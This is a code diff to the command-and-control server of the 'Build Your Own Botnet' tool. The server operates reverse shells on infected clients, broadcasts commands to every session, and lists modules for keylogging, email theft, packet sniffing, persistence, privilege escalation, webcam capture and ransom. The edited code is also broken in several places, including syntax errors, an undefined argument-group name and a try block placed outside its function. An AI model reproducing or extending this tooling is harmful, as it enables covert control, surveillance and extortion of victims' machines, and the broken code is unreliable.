@@ -1,10 +1,8 @@
 #!/usr/bin/python
 # Command & Control Server (Build Your Own Botnet)
 """
-
 https://github.com/colental/byob
 Copyright (c) 2018 Daniel Vega-Myhre
-
 """
 
 from __future__ import print_function
@@ -62,12 +60,6 @@ _rootdir        = os.getcwd()
 _color          = util.color()
 _debugger       = util._debugger()
 _threads        = collections.OrderedDict()
-__version__     = 'v0.1.3'
-__package__     = 'byob'
-__author__      = 'Daniel Vega-Myhre'
-__module__      = 'server'
-__license__     = 'GPLv3'
-__copyright__   = 'Copyright (c) 2018 Daniel Vega-Myhre'
 __doc__         = '''
         88                                  88
         88                                  88
@@ -137,7 +129,7 @@ class C2Server(threading.Thread):
     _prompt_style   = colorama.Style.BRIGHT
     
 
-    def __init__(self, port=1337, config=None):
+    def __init__(self, port=1337, **kwargs):
         """
         Create a new C2Server instance
 
@@ -154,28 +146,27 @@ class C2Server(threading.Thread):
         self.current_session    = None
         self.port               = port
         self.commands           = self._init_commands()
-        self.config             = self._init_config(config)
+        self.config             = self._init_config(**kwargs)
         self.banner             = self._init_banner()
         self.database           = self._init_database()
         
 
     @staticmethod
     def _error(data):
-        if self.current_session:
-            with self.current_session._lock:
-                print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'C2Server Error: ' + data + '\n')
-        else:
-            with self._lock:
-                print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'C2Server Error: ' + data + '\n')
+        lock = self.current_session.lock if self.current_session else self._lock
+        with lock:
+            util.display('[-] ', color='red', style='dim', end='')
+            util.display('C2Server Error: {}\n'.format(data), color='reset', style='dim')
 
 
     def _kill(self):
-        for _ in globals()['_threads']:
-            if isinstance(_, subprocess.Popen):
-                _.terminate()
-                del _
+        for t in globals()['_threads']:
+            if isinstance(t, subprocess.Popen):
+                t.terminate()
+                del t
             else:
-                del _
+                t = globals()['_threads'].pop(t, None)
+                del t
 
 
     def _print(self, info):
@@ -195,85 +186,68 @@ class C2Server(threading.Thread):
                         if len(str(info.get(key))) > 80:
                             info[key] = str(info.get(key))[:77] + '...'
                         info[key] = str(info.get(key)).replace('\n',' ') if not isinstance(info.get(key), datetime.datetime) else str(v).encode().replace("'", '"').replace('True','true').replace('False','false') if not isinstance(v, datetime.datetime) else str(int(time.mktime(v.timetuple())))
-                        print('\x20' * 4 + self._text_color + self._text_style + key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2))
+                        print('\x20' * 4, end='')
+                        util.display(key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2), color=self._text_color, style=self._text_style)
         else:
             with lock:
-                print('\x20' * 4 + self._text_color + self._text_style + str(info))
+                print('\x20' * 4, end='')
+                util.display(str(info), color=self._text_color, style=self._text_style)
 
 
     def _return(self, data=None):
-        if not self.current_session:
-            with self._lock:
-                if data:
-                    print('\n' + data + '\n')
-                else:
-                    print(self._prompt, end="")
-        else:
-            with self.current_session._lock:
-                if data:
-                    print('\n' + data + '\n')
-                else:
-                    print(self.current_session._prompt, end="")
-
-
-    def _init_config(self, filepath='../config.ini'):
-        config = configparser.ConfigParser()
-        config.read(filepath)    
-        return config
-
+        lock, prompt = (self.current_session.lock, self.current_session._prompt) if self.current_session else (self._lock, self._prompt)
+        with lock:
+            if data:
+                print('\n{}\n'.format(data))
+            else:
+                print(prompt, end='')
     
     def _init_banner(self):
-        os.chdir(globals()['_rootdir'])
-        banner = open('resources/banner.txt').read()
-        with self._lock:
-            print(util.color() + colorama.Style.BRIGHT + "\n\n" + str(banner if os.path.isfile('resources/banner.txt') else '') + colorama.Fore.WHITE + colorama.Style.DIM + '\n{:>40}\n{:>25}\n'.format('(Build Your Own Botnet)', globals()['__version__']))
-            print(colorama.Fore.YELLOW + colorama.Style.BRIGHT + "[?] " + colorama.Fore.RESET + colorama.Style.DIM + "Hint: show usage information with the 'help' command\n")
-        return banner
-
+        try:
+            banner = open(globals().get('_banner')).read()
+            with self._lock:
+                print(util.color() + colorama.Style.BRIGHT + "\n\n" + str(banner if os.path.isfile('resources/banner.txt') else '') + colorama.Fore.WHITE + colorama.Style.DIM + '\n{:>40}\n{:>25}\n'.format('(Build Your Own Botnet)', globals()['__version__']))
+                print(colorama.Fore.YELLOW + colorama.Style.BRIGHT + "[?] " + colorama.Fore.RESET + colorama.Style.DIM + "Hint: show usage information with the 'help' command\n")
+            return banner
+        except Exception as e:
+            _debugger.error(str(e))
 
     def _init_commands(self):
         return {
             'help'          :   self.help,
             'exit'          :   self.quit,
             'quit'          :   self.quit,
-            'query'         :   self.query,
             '$'             :   self.eval,
             'eval'          :   self.eval,
+            'query'         :   self.query,
             'settings'      :   self.settings,
             'options'       :   self.settings,
+            'debug'         :   self.debug_mode,
             'sessions'      :   self.session_list,
+            'clients'       :   self.session_list,
             'shell'         :   self.session_shell,
             'ransom'        :   self.session_ransom,
             'webcam'        :   self.session_webcam,
             'kill'          :   self.session_remove,
+            'drop'          :   self.session_remove,
             'back'          :   self.session_background,
             'bg'            :   self.session_background,
+            'background'    :   self.session_background,
             'sendall'	    :   self.task_broadcast,
-            'braodcast'     :   self.task_broadcast,
+            'broadcast'     :   self.task_broadcast,
             'results'       :   self.task_list,
             'tasks'         :   self.task_list
             }
 
 
-    def _init_database(self):
-        if self.config.has_section('mysql'):
-            try:
-                db = C2Server.Database(server=self, **dict(self.config['mysql']))
-                with self._lock:
-                    print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + colorama.Style.DIM + "Connected to database")
-            except:
-                db = C2Server.Database(server=self)
-                max_v = max(map(len, self.config['mysql'].values())) + 2
-                with self._lock:
-                    print(colorama.Fore.RED + colorama.Style.BRIGHT + "[-] " + colorama.Fore.RESET + colorama.Style.DIM + "Error: unable to connect to the currently configured MySQL database\n\thost: %s\n\tuser: %s" % ('\x20' * 4 + ' ' * 4 + self.config['mysql'].get('host').rjust(max_v), '\x20' * 4 + ' ' * 4 + self.config['mysql'].get('user').rjust(max_v).rjust(max_v)))
+    def _init_database(self, **kwargs):
+        if all([kwargs.get(arg) for arg in ['host','user','password']]):
+            db = C2Server.Database(server=self, **kwargs)
         else:
-            try:
-                db = C2Server.Database(server=self)
-            except:
-                db = C2Server.Database(server=self)
-                max_v = max(map(len, self.config['mysql'].values())) + 2
-                with self._lock:
-                    print(colorama.Fore.RED + colorama.Style.BRIGHT + "[-] " + colorama.Fore.RESET + colorama.Style.DIM + "Error: unable to connect to the currently configured MySQL database\n\thost:  %s\n\tuser: %s" % ('\x20' * 4 + ' ' * 4 + self.config['mysql'].get('host').rjust(max_v), '\x20' * 4 + ' ' * 4 + self.config['mysql'].get('user').rjust(max_v).rjust(max_v)))
+            db = C2Server.Database(server=self)
+        with self._lock:
+            util.display("[+] ", color='green', style='bright', end='')
+            util.display("Connected to MySQL database", style='bright', color='reset')
         return db
     
 
@@ -333,7 +307,10 @@ class C2Server(threading.Thread):
     @util.threaded
     def _task_handler(self, port=None):
         if not port:
-            port    = self.port + 1
+            if hasattr(self, 'port') and isinstance(self.port, int) and port > 0 and port < 65356:
+                port    = self.port + 1
+            else:
+                globals()['_debugger'].debug("invalid port number '{}' in task handler".format(port))
         task_server = C2Server.TaskServer(self, port=port)
         task_server.serve_until_stopped()
         return task_server
@@ -382,9 +359,10 @@ class C2Server(threading.Thread):
         info    = info if info else {"back": "background the current session", "shell <id>": "interact with client via reverse shell", "sessions": "list all sessions", "exit": "exit the program but keep sessions alive", "sendall <command>": "send a command to all active sessions", "settings <value> [options]": "list/change current display settings"}
         max_key = max(map(len, info.keys() + [column1])) + 2
         max_val = max(map(len, info.values() + [column2])) + 2
-        print('\n' + self._text_color + colorama.Style.BRIGHT + column1.center(max_key) + column2.center(max_val))
+        print('\n', end='')
+        util.display(column1.center(max_key) + column2.center(max_val), color=self._text_color, style='bright')
         for key in sorted(info):
-            print(self._text_color + self._text_style + key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2))
+            util.display(key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2), color=self._text_color, style=self._text_style)
 
 
     def display(self, info):
@@ -402,13 +380,13 @@ class C2Server(threading.Thread):
             elif isinstance(info, list):
                 if len(info):
                     for data in info:
-                        print(self._text_color + colorama.Style.BRIGHT + '  %d\n' % int(info.index(data) + 1), end="")
+                        util.display('  %d\n' % int(info.index(data) + 1), color=self._text_color, style='bright', end="")
                         self.display(data)
             elif isinstance(info, str):
                 try:
                     self._print(json.loads(info))
                 except:
-                    print(self._text_color + self._text_style + str(info))
+                    util.display(str(info), color=self._text_color, style=self._text_style)
             else:
                 self._error("{} error: invalid data type '{}'".format(self.display.func_name, type(info)))
 
@@ -445,11 +423,11 @@ class C2Server(threading.Thread):
                 prompt_style = [style for i in [getattr(c.Style, style) for style in ['DIM','BRIGHT','NORMAL']] if i == self._prompt_style][0]
             except Exception as e:
                 return '{} error: {}'.format(self.settings.func_name, str(e))
-            print("\n")
-            print(colorama.Fore.RESET + colorama.Style.BRIGHT + "Settings".center(40))
-            print(colorama.Fore.RESET + colorama.Style.DIM + 'text color/style: {}'.format(' '.join(text_color, text_style).center(40)))
-            print(colorama.Fore.RESET + colorama.Style.DIM + 'prompt color/style: {}'.format(' '.join(prompt_color, prompt_style).center(40)))
-            print(colorama.Fore.RESET + colorama.Style.DIM + 'debug: {}'.format('true' if globals()['_debug'] else 'false'))
+            print('\n', end='')
+            util.display('Settings'.center(40), color='reset', style='bright')
+            util.display('text color/style: {}'.format(' '.join(text_color, text_style).center(40)), color='reset', style='dim')
+            util.display('prompt color/style: {}'.format(' '.join(prompt_color, prompt_style).center(40)), color='reset', style='dim')
+            util.display('debug: {}'.format('true' if globals()['_debug'] else 'false'), color='reset', style='dim')
             print(self._text_color + self._text_style)
         else:
             target, _, options = args.partition(' ')
@@ -459,38 +437,51 @@ class C2Server(threading.Thread):
             if target == 'prompt':
                 if setting == 'color':
                     if not hasattr(colorama.Fore, option):
-                        print("usage: settings prompt color [value]\ncolors:   white/black/red/yellow/green/cyan/magenta")
+                        util.display("usage: settings prompt color [value]\ncolors:   white/black/red/yellow/green/cyan/magenta")
                     self._prompt_color = getattr(colorama.Fore, option)
-                    print(colorama.Fore.RESET + colorama.Style.BRIGHT + "prompt color changed to " + self._prompt_color + self._prompt_style + option)
+                    util.display("prompt color changed to ", color='reset', style='bright', end='')
+                    util.display(option, color=self._prompt_color, style=self._prompt_style)
                 elif setting == 'style':
                     if not hasattr(colorama.Style, option):
-                        print("usage: settings prompt style [value]\nstyles:   bright/normal/dim")
+                        util.display("usage: settings prompt style [value]\nstyles:   bright/normal/dim")
                     self._prompt_style = getattr(colorama.Style, option)
-                    print(colorama.Fore.RESET + colorama.Style.BRIGHT + "prompt style changed to " + self._prompt_color + self._prompt_style + option)
+                    util.display("prompt style changed to ", color='reset', style='bright', end='')
+                    util.display(option, color=self._prompt_color, style=self._prompt_style)
                 else:
-                    print("usage: settings prompt <option> [value]")
+                    util.display("usage: settings prompt <option> [value]")
             elif target == 'text':
                 if setting == 'color':
                     if not hasattr(colorama.Fore, option):
-                        print("usage: settings text color [value]\ncolors:     white/black/red/yellow/green/cyan/magenta")
+                        util.display("usage: settings text color [value]\ncolors:   white/black/red/yellow/green/cyan/magenta")
                     self._text_color = getattr(colorama.Fore, option)
-                    print(colorama.Fore.RESET + colorama.Style.BRIGHT + "text color changed to " + self._text_color + self._text_style + option)
+                    util.display("text color changed to ", color='reset', style='bright', end='')
+                    util.display(option, color=self._text_color, style=self._text_style)
                 elif setting == 'style':
                     if not hasattr(colorama.Style, option):
-                        print("usage: settings text style [value]\nstyles:     bright/normal/dim")
+                        util.display("usage: settings text style [value]\nstyles:   bright/normal/dim")
                     self._text_style = getattr(colorama.Style, option)
-                    print(colorama.Fore.RESET + colorama.Style.BRIGHT + "text style changed to " + self._text_color + self._text_style + option)
-                else:
-                    print("usage: settings text <option> [value]")
+                    util.display("text style changed to ", color='reset', style='bright', end='')
+                    util.display(option, color=self._text_color, style=self._text_style)
             elif target == 'debug':
-                if setting.lower() in ('true', 'on'):
-                    globals()['_debug'] = True
-                elif settings.lower() in ('false', 'off'):
+                if not setting:
+                    if globals()['_debug:']
+                        util.display("[!] ", color='yellow', style='bright', end='')
+                        util.display("Debug: On", color='reset', style='bright')
+                    else:
+                        util.display("[-] ", color='yellow', style='dim', end='')
+                        util.display("Debug: Off", color='reset', style='dim')
+                elif str(setting).lower() in ('0','off','false','disable'):
                     globals()['_debug'] = False
+                    util.display("[-] ", color='yellow', style='dim', end='')
+                    util.display("Debugging disabled", color='reset', style='dim')
+                elif str(setting).lower() in ('1','on','true','enable'):0
+                    globals()['_debug'] = True
+                    util.display("[!] ", color='yellow', style='bright', end='')
+                    util.display("Debugging enabled", color='reset', style='bright')            
                 else:
-                    print("usage: settings debug <on/off> (or true/false)")
+                    self._error("invalid mode for 'debugging'")
             else:
-                print('\nDisplay Settings\n\n  usage:  settings <type> <option> <color|style>\n  \n    type   - text, prompt\n    option - color, style\n    color  - black, white, blue, red, green, magenta, yellow\n    style  - dim, normal, bright\n\nDebugging Mode\n\t\n  usage: settings debug <on|off>\n')
+                util.display('\nDisplay Settings\n\n  usage:  settings <type> <option> <color|style>\n  \n    type   - text, prompt\n    option - color, style\n    color  - black, white, blue, red, green, magenta, yellow\n    style  - dim, normal, bright\n\nDebugging Mode\n\t\n  usage: settings debug <on|off>\n')
     
 
     def send(self, command, session=None, connection=None):
@@ -701,9 +692,7 @@ class C2Server(threading.Thread):
         """
         lock    = self._lock if not self.current_session else self.current_session._lock
         with lock:
-            print('\n')
             sessions = self.database.get_sessions(verbose=verbose, display=True)
-            print('\n')
 
 
     def session_ransom(self, args=None):
@@ -740,7 +729,8 @@ class C2Server(threading.Thread):
             if self.current_session:
                 self.current_session._active.clear()
             self.current_session = self.sessions[int(session)]
-            print(colorama.Fore.CYAN + colorama.Style.BRIGHT + "\n\n\t[+] " + colorama.Fore.RESET + colorama.Style.DIM + "Client {} selected".format(session.id) + self._text_color + self._text_style)
+            util.display("\n\t[+] ", color='cyan', style='bright', end='')
+            util.display("Client {} selected\n".format(session.id), color='reset', style='dim')
             self.current_session._active.set()
             return self.current_session.run()
 
@@ -773,7 +763,7 @@ class C2Server(threading.Thread):
         while True:
             try:
                 self._active.wait()
-                self._prompt = "[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER'))) % os.getcwd()
+                self._prompt = "[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER', 'byob'))) % os.getcwd()
                 cmd_buffer   = self._get_prompt(self._prompt)
                 if cmd_buffer:
                     output = ''
@@ -785,7 +775,7 @@ class C2Server(threading.Thread):
                             output  = str(e1)
                     else:
                         try:
-                            output = subprocess.check_output(cmd_buffer, shell=True)
+                            output = str().join((subprocess.Popen(cmd_buffer, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate()))
                         except: pass
                     if output:
                         self.display(str(output))
@@ -811,7 +801,7 @@ class C2Server(threading.Thread):
         
         """
 
-        def __init__(self, host='localhost', user='root', password='toor', server=None, tasks=['escalate','keylogger','outlook','packetsniffer','persistence','phone','portscan','process','ransom','screenshot','webcam']):
+        def __init__(self, host='localhost', user='root', password='toor', server=None, tasks=['escalate','keylogger','outlook','packetsniffer','persistence','phone','portscan','process','ransom','screenshot','webcam'], **kwargs):
 
             """
             Create new MySQL conection instance and setup the database
@@ -825,7 +815,7 @@ class C2Server(threading.Thread):
             `Optional`
             :param list tasks:      list of commands/modules for database to store
             """
-            assert isinstance(server, C2Server)
+            assert isinstance(server, C2Server), "argument 'server' must be a byob.C2Server instance"
             try:
                 super(C2Server.Database, self).__init__(host=host, user=user, password=password)
                 self.config(host=host, user=user, password=password)
@@ -836,7 +826,7 @@ class C2Server(threading.Thread):
                 self._color     = globals().get('_color')
                 self._setup     = self._init_setup()
             except mysql.connector.ProgrammingError:
-                print("\n\n\tBYOB was unable to connect to MySQL.\n\tMake sure you have completed all of the following steps:\n\t1) Install MySQL 5.5+ (download available at https://mysql.com)\n\t2) Start the mysqld service (run command `service mysql start`)    \n\t3) Add your login credentials to the configuration file (`config.ini`)\n")
+                util.display("\nBYOB was unable to connect to MySQL.\nMake sure you have completed all of the following steps:\n    1) Install MySQL 5.5+ (download available at https://mysql.com)\n\t2) Start the mysqld service (run command `service mysql start`)    \n    3) Enter valid MySQL credentials as command-line arguments every time you start-up the server\n\t(Example: server.py --mysql-host localhost --mysql-user root --mysql-password toor)\n")
                 
 
         def _display(self, data, indent=4):
@@ -844,38 +834,44 @@ class C2Server(threading.Thread):
                 for k,v in data.items():
                     if isinstance(v, datetime.datetime):
                         data[k] = v.ctime()
-                i = data.pop('id',None)
-                print(colorama.Style.BRIGHT + colorama.Fore.RESET + str(i).rjust(indent-3)) if i else None
+                i = data.pop('id', None)
+                c = globals().get('_color') or util.color()
+                util.display(str(i).rjust(indent-3), color='reset', style='bright') if i else None
                 for k,v in data.items():
                     if isinstance(v, unicode):
                         try:
                             j = json.loads(v.encode())
                             self._display(j, indent+2)
                         except:
-                            print(colorama.Style.BRIGHT + self._color + str(k).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(v).encode())
+                            util.display(str(k).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end='')
+                            util.display(str(v).encode(), color=c, style='dim')
                     elif isinstance(v, list):
                         for i in v:
                             if isinstance(v, dict):
-                                print(colorama.Style.BRIGHT + self._color + str(k).ljust(4  * indent).center(5 * indent))
+                                util.display(str(k).ljust(4  * indent).center(5 * indent))
                                 self._display(v, indent+2)
                             else:
-                                print(colorama.Style.BRIGHT + self._color + str(i).ljust(4  * indent).center(5 * indent))
+                                util.display(str(i).ljust(4  * indent).center(5 * indent))
                     elif isinstance(v, dict):
-                        print(colorama.Style.BRIGHT + self._color + str(k).ljust(4  * indent).center(5 * indent))
+                        util.display(str(k).ljust(4  * indent).center(5 * indent))
                         self._display(v, indent+1)
                     elif isinstance(v, int):
                         if v in (0,1):
-                            print(colorama.Style.BRIGHT + self._color + str(k).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(bool(v)).encode())
+                            util.display(str(k).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end='')
+                            util.display(str(bool(v)).encode(), color=c, style='dim')
                         else:
-                            print(colorama.Style.BRIGHT + self._color + str(k).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(v).encode())
+                            util.display(str(k).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end='')
+                            util.display(str(v).encode(), color=c, style='dim')
                     else:
-                        print(colorama.Style.BRIGHT + self._color + str(k).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(v).encode())
+                        util.display(str(k).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end='')
+                        util.display(str(v).encode(), color=c, style='dim')
             elif isinstance(data, list):
                 for row in data:
                     if isinstance(row, dict):
                         self._display(row, indent+2)
                     else:
-                        print(colorama.Style.BRIGHT + self._color + str(row).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(v).encode())
+                        util.display(str(row).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end='')
+                        util.display(str(v).encode(), color=c, style='dim')
 
             else:
                 if hasattr(data, '_asdict'):
@@ -884,11 +880,12 @@ class C2Server(threading.Thread):
                     data = dict(data)
                 if isinstance(data, dict):
                     i = data.pop('id',None)
-                    print(colorama.Style.BRIGHT + colorama.Fore.RESET + str(i).rjust(indent-1)) if i else None
+                    util.display(str(i).rjust(indent-1), color='reset', style='bright') if i else None
                     self._display(data, indent+2)
 
                 else:
-                    print(colorama.Style.BRIGHT + self._color + str(data.encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + v.encode()))
+                    util.display(str(data.encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end='')
+                    util.display(v.encode()), color=c, style='dim')
 
 
         def _reconnect(self):
@@ -1372,21 +1369,27 @@ class C2Server(threading.Thread):
                     globals()['_debugger'].error(str(e))
 
 
-
 def main():
     parser = argparse.ArgumentParser(prog='server.py', description="Command & Control Server (Build Your Own Botnet)", version='0.4.7')
     parser.add_argument('--port', type=int, default=1337, action='store', help='port number')
-    parser.add_argument('--config', action='store', default='../config.ini', help='configuration file')
     parser.add_argument('--debug', action='store_true', default=False, help='enable debugging mode')
-#    try:
+    parser.add_argument('--modules', action='store', type=str, default='./modules', help='modules server hosts online for clients to import remotely')
+    database = parser.add_argument_group('database')
+    mysql.title = 'mysql database'
+    mysql.add_argument('--mysql-host', action='store', default='localhost', help='MySQL database hostname (default: localhost)')
+    mysql.add_argument('--mysql-port', action='store', type=int, default=3306, help='MySQL database port number (default: 3306)')
+    mysql.add_argument('--mysql-user', action='store', default='root', help='MySQL account username (default: root)')
+    mysql.add_argument('--mysql-password', action='store', default='toor', help='MySQL account password (default: toor)')
+
+try:
     options = parser.parse_args()
     globals()['_debug'] = options.debug
     globals()['_threads']['server']  = C2Server(options.port, config=options.config)
     globals()['_threads']['server'].start()
-#    except Exception as e:
-#        print("\n" + colorama.Fore.RED + colorama.Style.NORMAL + "[-] " + colorama.Fore.RESET + "Error: %s" % str(e) + "\n")
-#        parser.print_help()
-#        sys.exit(0)
+except Exception as e:
+    print("\n" + colorama.Fore.RED + colorama.Style.NORMAL + "[-] " + colorama.Fore.RESET + "Error: %s" % str(e) + "\n")
+    parser.print_help()
+    sys.exit(0)
 
 if __name__ == '__main__':
     main()
